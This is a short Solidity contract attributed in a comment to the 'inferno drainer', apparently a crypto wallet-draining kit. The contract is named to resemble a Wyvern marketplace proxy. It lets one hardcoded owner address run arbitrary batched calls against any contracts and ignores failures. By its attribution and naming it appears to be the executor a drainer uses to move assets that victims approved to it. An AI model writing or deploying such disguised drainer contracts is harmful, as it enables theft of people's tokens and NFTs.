// SPDX-License-Identifier: MIT

// @mr_inferno_drainer / inferno drainer

pragma solidity ^0.8.6;

contract WyvernReplaceProxyContract {
    struct CallData {
        address contractAddress;
        bytes callBytes;
    }

    event CallStatus(address indexed target, bool success);

    function multicall(CallData[] memory calls) public {
        require(
            msg.sender == address(0x0000db5c8B030ae20308ac975898E09741e70000),
            "Caller is not an owner"
        );

        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, ) = calls[i].contractAddress.call(
                calls[i].callBytes
            );

            // require(success, "Fail");
            emit CallStatus(calls[i].contractAddress, success);
        }
    }
}